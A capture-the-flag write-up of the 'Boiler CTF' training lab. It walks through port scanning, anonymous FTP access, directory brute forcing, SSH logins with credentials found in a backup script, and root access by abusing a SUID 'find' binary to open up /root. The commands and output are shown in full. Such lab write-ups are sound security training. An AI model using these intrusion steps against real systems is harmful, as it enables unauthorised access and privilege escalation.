# Boiler CTF

# credentials

```bash
basterd : superduperp@$$
stoner  : superduperp@$$no1knows
```

## Port Scanning

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/boiler-ctf]
└─$ sudo naabu -p - -host boiler.thm -nmap-cli "-A -o nmap"

                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/

                projectdiscovery.io

[INF] Current naabu version 2.3.5 (latest)
[WRN] UI Dashboard is disabled, Use -dashboard option to enable
[INF] Running CONNECT scan with non root privileges
boiler.thm:10000
boiler.thm:55007
boiler.thm:21
[INF] Found 3 ports on host boiler.thm (10.49.154.77)
[INF] Running nmap command: -A -o nmap -p 10000,55007,21 10.49.154.77
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 10:49 CST
Nmap scan report for boiler.thm (10.49.154.77)
Host is up (0.028s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.129.52
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   24.81 ms 192.168.128.1
2   ...
3   27.04 ms boiler.thm (10.49.154.77)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.73 seconds

```

## FTP

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/boiler-ctf]
└─$ ftp anonymous@boiler.thm   
Connected to boiler.thm.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43392|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls
229 Entering Extended Passive Mode (|||40449|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||47246|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||44522|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |****************************************************************************************************************|    74      269.64 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (2.37 KiB/s)
ftp> exit
221 Goodbye.
```

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/boiler-ctf]
└─$ cat .info.txt        
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

decoded : “Just wanted to see if you find it. Lol. Remember: Enumeration is the key!”
```

## Directory Bruteforcing

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/boiler-ctf]
└─$ gobuster dir -u boiler.thm  -w /usr/share/wordlists/dirb/common.txt -t 50 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://boiler.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 294]
/.hta                 (Status: 403) [Size: 289]
/index.html           (Status: 200) [Size: 11321]
/joomla               (Status: 301) [Size: 309] [--> http://boiler.thm/joomla/]
/.htaccess            (Status: 403) [Size: 294]
/manual               (Status: 301) [Size: 309] [--> http://boiler.thm/manual/]
/robots.txt           (Status: 200) [Size: 257]
/server-status        (Status: 403) [Size: 298]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

![robots.txt](/images/image.png)

![image.png](/images/image1.png)

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/boiler-ctf]
└─$ gobuster dir -u boiler.thm/joomla -w /usr/share/wordlists/dirb/common.txt -t 50 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://boiler.thm/joomla
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/_files               (Status: 301) [Size: 316] [--> http://boiler.thm/joomla/_files/]
/_test                (Status: 301) [Size: 315] [--> http://boiler.thm/joomla/_test/]
/~www                 (Status: 301) [Size: 314] [--> http://boiler.thm/joomla/~www/]
/administrator        (Status: 301) [Size: 323] [--> http://boiler.thm/joomla/administrator/]
/bin                  (Status: 301) [Size: 313] [--> http://boiler.thm/joomla/bin/]
/build                (Status: 301) [Size: 315] [--> http://boiler.thm/joomla/build/]
/cache                (Status: 301) [Size: 315] [--> http://boiler.thm/joomla/cache/]
/.htpasswd            (Status: 403) [Size: 301]
/_archive             (Status: 301) [Size: 318] [--> http://boiler.thm/joomla/_archive/]
/components           (Status: 301) [Size: 320] [--> http://boiler.thm/joomla/components/]
/.hta                 (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 301]
/_database            (Status: 301) [Size: 319] [--> http://boiler.thm/joomla/_database/]
/images               (Status: 301) [Size: 316] [--> http://boiler.thm/joomla/images/]
/includes             (Status: 301) [Size: 318] [--> http://boiler.thm/joomla/includes/]
/index.php            (Status: 200) [Size: 12474]
/installation         (Status: 301) [Size: 322] [--> http://boiler.thm/joomla/installation/]
/language             (Status: 301) [Size: 318] [--> http://boiler.thm/joomla/language/]
/layouts              (Status: 301) [Size: 317] [--> http://boiler.thm/joomla/layouts/]
/libraries            (Status: 301) [Size: 319] [--> http://boiler.thm/joomla/libraries/]
/media                (Status: 301) [Size: 315] [--> http://boiler.thm/joomla/media/]
/modules              (Status: 301) [Size: 317] [--> http://boiler.thm/joomla/modules/]
/plugins              (Status: 301) [Size: 317] [--> http://boiler.thm/joomla/plugins/]
/templates            (Status: 301) [Size: 319] [--> http://boiler.thm/joomla/templates/]
/tests                (Status: 301) [Size: 315] [--> http://boiler.thm/joomla/tests/]
/tmp                  (Status: 301) [Size: 313] [--> http://boiler.thm/joomla/tmp/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

![image.png](/images/image2.png)

![image.png](/images/image3.png)

![image.png](/images/image4.png)

![image.png](/images/image5.png)

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/boiler-ctf]
└─$ gobuster dir -u http://boiler.thm/joomla/installation/ -w /usr/share/wordlists/dirb/common.txt -t 50 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://boiler.thm/joomla/installation/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 314]
/.hta                 (Status: 403) [Size: 309]
/.htaccess            (Status: 403) [Size: 314]
/application          (Status: 301) [Size: 334] [--> http://boiler.thm/joomla/installation/application/]
/cache                (Status: 301) [Size: 328] [--> http://boiler.thm/joomla/installation/cache/]
/controller           (Status: 301) [Size: 333] [--> http://boiler.thm/joomla/installation/controller/]
/favicon.ico          (Status: 200) [Size: 2019]
/form                 (Status: 301) [Size: 327] [--> http://boiler.thm/joomla/installation/form/]
/helper               (Status: 301) [Size: 329] [--> http://boiler.thm/joomla/installation/helper/]
/html                 (Status: 301) [Size: 327] [--> http://boiler.thm/joomla/installation/html/]
/index.php            (Status: 200) [Size: 5794]
/language             (Status: 301) [Size: 331] [--> http://boiler.thm/joomla/installation/language/]
/model                (Status: 301) [Size: 328] [--> http://boiler.thm/joomla/installation/model/]
/sql                  (Status: 301) [Size: 326] [--> http://boiler.thm/joomla/installation/sql/]
/template             (Status: 301) [Size: 331] [--> http://boiler.thm/joomla/installation/template/]
/view                 (Status: 301) [Size: 327] [--> http://boiler.thm/joomla/installation/view/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

![image.png](/images/image6.png)

![image.png](/images/image7.png)

![image.png](/images/image8.png)

![image.png](/images/image9.png)

![image.png](/images/image10.png)

![image.png](/images/image11.png)

![image.png](/images/image12.png)

![image.png](/images/image13.png)

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/boiler-ctf]
└─$ gobuster dir -u http://boiler.thm/manual/en/ -w /usr/share/wordlists/dirb/common.txt -t 50 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://boiler.thm/manual/en/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 304]
/.hta                 (Status: 403) [Size: 299]
/developer            (Status: 301) [Size: 322] [--> http://boiler.thm/manual/en/developer/]
/.htpasswd            (Status: 403) [Size: 304]
/faq                  (Status: 301) [Size: 316] [--> http://boiler.thm/manual/en/faq/]
/howto                (Status: 301) [Size: 318] [--> http://boiler.thm/manual/en/howto/]
/index.html           (Status: 200) [Size: 9282]
/misc                 (Status: 301) [Size: 317] [--> http://boiler.thm/manual/en/misc/]
/mod                  (Status: 301) [Size: 316] [--> http://boiler.thm/manual/en/mod/]
/programs             (Status: 301) [Size: 321] [--> http://boiler.thm/manual/en/programs/]
/ssl                  (Status: 301) [Size: 316] [--> http://boiler.thm/manual/en/ssl/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

![image.png](/images/image14.png)

![image.png](/images/image15.png)

## SSH

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/boiler-ctf]
└─$ ssh basterd@boiler.thm -p 55007
The authenticity of host '[boiler.thm]:55007 ([10.49.154.77]:55007)' can't be established.
ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[boiler.thm]:55007' (ED25519) to the list of known hosts.
basterd@boiler.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.

Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$ id
uid=1001(basterd) gid=1001(basterd) groups=1001(basterd)
$ whoami
basterd
$ pwd
/home/basterd
$ ls
backup.sh
$ ls -la
total 16
drwxr-x--- 3 basterd basterd 4096 Aug 22  2019 .
drwxr-xr-x 4 root    root    4096 Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4096 Aug 22  2019 .cache

```

```bash
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE

if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi

```

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/boiler-ctf]
└─$ ssh stoner@boiler.thm -p 55007
stoner@boiler.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Thu Aug 22 16:05:13 2019
stoner@Vulnerable:~$ id
uid=1000(stoner) gid=1000(stoner) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
stoner@Vulnerable:~$ whoami
stoner
stoner@Vulnerable:~$ pwd
/home/stoner
stoner@Vulnerable:~$ ls -la
total 20
drwxr-x--- 4 stoner stoner 4096 Nov  7 19:02 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwx------ 2 stoner stoner 4096 Nov  7 19:02 .cache
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.

```

## Priesc😒😒😒

```bash
stoner@Vulnerable:~$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
stoner@Vulnerable:~$  find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
-rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount
-rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount
-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
-rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap
-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
-rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap
stoner@Vulnerable:~$ find . -exec chmod 777 /root \;
stoner@Vulnerable:~$ id
uid=1000(stoner) gid=1000(stoner) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
stoner@Vulnerable:~$ whoami
stoner
stoner@Vulnerable:~$ cd /root                                                                                                                                
stoner@Vulnerable:/root$ ls                                                                                                                                  
root.txt
stoner@Vulnerable:/root$ cat root.txt
It wasn't that hard, was it?
stoner@Vulnerable:/root$ 

```